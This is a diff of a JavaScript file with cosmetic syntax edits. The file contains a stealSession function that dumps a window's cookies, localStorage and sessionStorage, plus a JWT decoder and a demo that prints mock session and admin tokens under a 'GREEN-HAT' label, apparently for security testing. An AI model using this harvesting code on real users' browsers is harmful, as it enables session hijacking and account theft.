@@ -28,9 +28,7 @@ function stealSession(win) {
       const k = w.localStorage.key(i);
       if (k) ls[k] = w.localStorage.getItem(k) || "";
     }
-  } catch {
-    /* bloqueado */
-  }
+  } catch (_) { /* bloqueado */ }
 
   // 3. Dump sessionStorage
   const ss = {};
@@ -39,9 +37,7 @@ function stealSession(win) {
       const k = w.sessionStorage.key(i);
       if (k) ss[k] = w.sessionStorage.getItem(k) || "";
     }
-  } catch {
-    /* bloqueado */
-  }
+  } catch (_) { /* bloqueado */ }
 
   return { cookies, localStorage: ls, sessionStorage: ss };
 }
@@ -57,7 +53,7 @@ function decodeJwt(token) {
     if (parts.length !== 3) return null;
     const payload = Buffer.from(parts[1], "base64url").toString("utf-8");
     return JSON.parse(payload);
-  } catch {
+  } catch (_) {
     return null;
   }
 }
@@ -72,9 +68,9 @@ if (require.main === module) {
     cookies: "laravel_session=abc123; XSRF-TOKEN=xyz789",
     localStorage: {
       auth_token: "eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiMSIsInJvbGUiOiJhZG1pbiJ9.fake",
-      user_prefs: '{"theme":"dark"}',
+      user_prefs: '{"theme":"dark"}'
     },
-    sessionStorage: { csrf_token: "mock_csrf_abc", last_route: "/dashboard" },
+    sessionStorage: { csrf_token: "mock_csrf_abc", last_route: "/dashboard" }
   };
 
   console.log("[GREEN-HAT] Cookies:", mockData.cookies);
